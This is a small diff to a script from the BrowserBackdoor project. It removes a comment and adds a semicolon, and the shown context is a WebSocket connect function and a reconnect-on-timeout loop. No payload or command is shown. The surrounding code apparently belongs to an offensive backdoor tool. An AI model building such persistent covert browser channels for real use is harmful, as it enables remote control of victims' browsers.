@@ -8,7 +8,6 @@
          * BrowserBackdoor - https://github.com/IMcPwn/browser-backdoor
          * See the file 'LICENSE' for copying permission
          */
-        // WebSocket connection
         var ws;
 
         function wsConnect(url) {
@@ -57,7 +56,7 @@
                     wsConnect(url);
                 }
             }, timeout);
-        }
+        };
 
         main();
     </script>
